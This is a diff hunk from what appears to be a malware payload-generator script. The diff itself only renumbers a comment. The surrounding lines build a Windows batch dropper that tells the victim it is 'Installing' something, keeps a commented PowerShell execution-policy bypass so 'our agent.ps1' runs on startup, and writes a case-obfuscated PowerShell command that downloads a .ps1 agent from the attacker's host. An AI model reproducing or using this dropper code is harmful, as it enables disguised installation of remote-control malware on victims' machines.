@@ -12377,7 +12377,7 @@ else
       echo "echo Please Wait, Installing $NaM .." >> $IPATH/output/$Drop.$ext.bat
       
       ## Setting target PS to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup
-      # REMARK: UN-COMMENT (delete the # in front of command) in the next line (12380) to activate PS policy bypass ..
+      # REMARK: UN-COMMENT (delete the # in front of command) in the next line (12381) to activate PS policy bypass ..
       # echo "cmd.exe /R echo Y | powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
 
       echo "PoWeRsHeLl.exe -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
